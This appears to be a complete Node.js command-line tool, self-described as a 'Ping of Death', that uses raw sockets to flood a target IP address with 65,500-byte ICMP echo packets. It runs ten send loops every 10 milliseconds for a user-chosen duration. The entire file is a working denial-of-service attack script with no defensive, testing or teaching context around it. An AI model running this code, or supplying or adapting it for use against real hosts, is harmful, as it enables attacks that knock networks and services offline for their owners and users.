const raw = require('raw-socket');

if (process.argv.length < 4) {
    console.log('Usage: ping.js <ip> <duration>');
    process.exit(1);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000; // Convert duration to milliseconds

// Default values for packet size, threads, and interval
const packetSize = 65500; // Default packet size
const threads = 10; // Default number of threads
const interval = 10; // Default interval in milliseconds

// Maximum ICMP packet size including headers is 65535 bytes, but the actual payload size must be smaller
const MAX_PAYLOAD_SIZE = 65507; // 65535 - 20 (IP header) - 8 (ICMP header)

if (packetSize > MAX_PAYLOAD_SIZE) {
    console.log(`Packet size should not exceed ${MAX_PAYLOAD_SIZE} bytes`);
    process.exit(1);
}

// Function to calculate checksum
function checksum(buf) {
    let sum = 0;
    for (let i = 0; i < buf.length - 1; i += 2) {
        sum += buf.readUInt16BE(i);
        sum = (sum & 0xffff) + (sum >> 16);
    }
    if (buf.length % 2 === 1) {
        sum += buf.readUInt8(buf.length - 1) << 8;
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return ~sum & 0xffff;
}

const createICMPPacket = () => {
    const buf = Buffer.alloc(packetSize);
    buf.writeUInt8(8, 0); // Type: 8 (Echo)
    buf.writeUInt8(0, 1); // Code: 0
    buf.writeUInt16BE(0, 2); // Checksum: 0 initially
    buf.writeUInt16BE(process.pid & 0xffff, 4); // Identifier
    buf.writeUInt16BE(0, 6); // Sequence number

    // Fill payload with 'A' characters
    for (let i = 8; i < packetSize; i++) {
        buf.writeUInt8(65, i);
    }

    // Calculate checksum
    const check = checksum(buf);
    buf.writeUInt16BE(check, 2);

    return buf;
};

const options = {
    protocol: raw.Protocol.ICMP,
};

const sendPing = () => {
    const socket = raw.createSocket(options);
    const message = createICMPPacket();

    socket.on('error', (error) => {
        console.error('Socket error:', error);
    });

    socket.send(message, 0, message.length, target, (error, bytes) => {
        if (error) {
            console.error('Send error:', error);
        }
    });

    setTimeout(() => {
        socket.close();
    }, duration);
};

const startFlood = () => {
    for (let i = 0; i < threads; i++) {
        const flood = () => {
            sendPing();
            setTimeout(flood, interval);
        };
        setImmediate(flood);
    }
};

console.log(`Starting Ping of Death to ${target} with packet size ${packetSize} bytes, ${threads} threads, interval ${interval} ms for ${duration / 1000} seconds`);
startFlood();

setTimeout(() => {
    console.log('Stopping Ping of Death');
    process.exit(0);
}, duration);